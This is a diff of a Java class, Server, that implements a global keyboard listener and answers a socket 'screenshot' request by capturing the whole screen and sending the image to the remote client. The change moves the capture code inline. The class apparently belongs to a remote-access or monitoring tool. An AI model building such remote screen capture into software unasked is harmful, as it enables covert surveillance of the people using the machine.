@@ -88,7 +88,15 @@ public class Server implements NativeKeyListener {
 
                 } else if (request.equals("screenshot")) {
                     try {
-                        byte[] screenshotBytes = captureScreenshot();
+                        Robot robot = new Robot();
+                        Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
+                        BufferedImage screenshot = robot.createScreenCapture(screenRect);
+
+                        ByteArrayOutputStream baos = new ByteArrayOutputStream();
+                        ImageIO.write(screenshot, "png", baos);
+
+                        byte[] screenshotBytes = baos.toByteArray();
+                        baos.close();
                         writer.println(screenshotBytes.length);
                         writer.flush();
                         socket.getOutputStream().write(screenshotBytes);
@@ -214,24 +222,6 @@ public class Server implements NativeKeyListener {
 
     private  static boolean stopService(String serviceName) {
         return false;
-    }
-
-    private static byte[] captureScreenshot() {
-        try {
-            Robot robot = new Robot();
-            Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
-            BufferedImage screenshot = robot.createScreenCapture(screenRect);
-
-            ByteArrayOutputStream baos = new ByteArrayOutputStream();
-            ImageIO.write(screenshot, "PNG", baos);
-            baos.flush();
-            baos.close();
-
-            return baos.toByteArray();
-        } catch (AWTException | IOException e) {
-            e.printStackTrace();
-            return null;
-        }
     }
 }
 
